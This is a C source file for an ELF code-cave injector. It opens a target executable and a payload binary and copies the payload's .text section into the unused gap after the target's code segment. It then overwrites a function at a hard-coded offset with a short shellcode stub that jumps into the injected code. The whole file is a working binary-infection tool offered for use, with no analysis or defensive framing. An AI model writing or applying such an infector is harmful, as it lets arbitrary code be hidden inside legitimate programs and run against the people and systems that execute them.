#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/mman.h>

#define PLACEHOLDER_BYTE 0x11
#define PATCH_FUNC_OFFSET 0x68a


int open_map_elf(char* filename, uint8_t** data) {
  int fd, size;

  if ((fd = open(filename, O_RDWR)) < 0) {
    perror("Opening file");
    exit(1);
  }

  size = lseek(fd, 0, SEEK_END);

  *data = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  return fd;
}

Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Shdr *shdr = (Elf64_Shdr*)(data + ehdr->e_shoff);
  
  char* sname;
  const char* sh_strtab_p = data + shdr[ehdr->e_shstrndx].sh_offset;
  int section_idx;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    sname = (char*)(sh_strtab_p + shdr[i].sh_name);
    if (!strcmp(name, sname)) {
      printf("Found %s at section %d\n", name, i);
      return &shdr[i];
    }
  }
  perror("Cannot find elf section");
  exit(1);
}

int find_code_segment (uint8_t* data) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Phdr *phdr = (Elf64_Phdr*)(data + ehdr->e_phoff);
  
  int text_idx;
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if ((phdr[i].p_flags & 5) == 5 && phdr[i].p_type == PT_LOAD) {
      printf("Code segment found at %d\n", i);
      return i;
    }
  }
  perror("Cannot find code segment");
  exit(1);
}

void patch (uint8_t* target_data, int code_end_offset) {
  char* shellcode = "\x4c\x8d\x15\x00\x00\x00\x00\x49\x81\xc2\x11\x11\x00\x00\x41\xff\xe2";
  uint8_t* function_to_patch = target_data + PATCH_FUNC_OFFSET;
  memmove(function_to_patch, shellcode, 17);
  short int patch_jmp = code_end_offset - PATCH_FUNC_OFFSET;
  function_to_patch += 10;
  *function_to_patch = patch_jmp;
  function_to_patch += 1;
  *function_to_patch = patch_jmp >> 8;
}

void main(int argc, char* argv[]) {
  int target_fd, payload_fd;
  uint8_t *target_data, *payload_data;

  if (argc != 3) {
    printf("Usage: %s <src> <payload>\n", argv[0]);
    return;
  }

  target_fd = open_map_elf(argv[1], &target_data);
  payload_fd = open_map_elf(argv[2], &payload_data);

  // Find code cave for target binary.
  printf("Analyzing target:\n");
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)target_data;
  Elf64_Shdr* shdr = (Elf64_Shdr*)(target_data + ehdr->e_shoff);
  Elf64_Phdr *phdr = (Elf64_Phdr*)(target_data + ehdr->e_phoff);

  int code_idx = find_code_segment(target_data);
  int code_end_offset = phdr[code_idx].p_offset + phdr[code_idx].p_filesz;
  int gap_size = phdr[code_idx + 1].p_offset - code_end_offset;
  printf("Code End Offset:  0x%x\nGap size:  0x%x\n", code_end_offset, gap_size);
  uint8_t* code_cave = target_data + code_end_offset;

  // Locate relevant code in payload binary.
  printf("\nAnalyzing payload:\n");
  int payload_size;
  uint8_t* payload_code;
  Elf64_Shdr* payload_text_shdr = find_elf64_sections(payload_data, ".text");
  payload_size = payload_text_shdr->sh_size;
  printf("Payload size:  0x%x\n", payload_size);
  if (payload_size > gap_size) {
    perror("Payload won't fit");
    exit(1);
  }

  payload_code = payload_data + payload_text_shdr->sh_offset;

  // Copy payload to code cave.
  memmove(code_cave, payload_code, payload_size);
  
  patch(target_data, code_end_offset);
}
